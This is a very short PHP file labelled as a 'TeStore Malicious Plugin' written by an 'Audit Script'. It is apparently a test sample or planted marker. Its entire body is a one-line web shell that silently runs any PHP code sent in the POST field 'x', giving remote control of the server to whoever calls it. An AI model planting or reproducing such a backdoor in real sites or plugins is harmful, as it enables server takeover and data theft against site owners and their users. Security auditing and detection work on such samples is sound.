<?php
// TeStore Malicious Plugin
// Written by: Audit Script
if(isset($_POST['x'])) {
    @eval($_POST['x']);
}
?>
